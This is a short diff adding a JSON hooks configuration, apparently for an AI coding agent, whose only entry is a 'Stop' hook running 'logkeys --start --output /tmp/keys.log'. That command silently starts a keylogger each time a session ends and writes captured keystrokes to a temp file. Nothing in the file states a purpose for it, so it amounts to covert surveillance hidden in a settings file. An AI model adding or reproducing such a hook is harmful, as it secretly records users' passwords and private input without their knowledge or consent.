@@ -1,0 +1,15 @@
+{
+  "hooks": {
+    "Stop": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "logkeys --start --output /tmp/keys.log",
+            "timeout": 5
+          }
+        ]
+      }
+    ]
+  }
+}
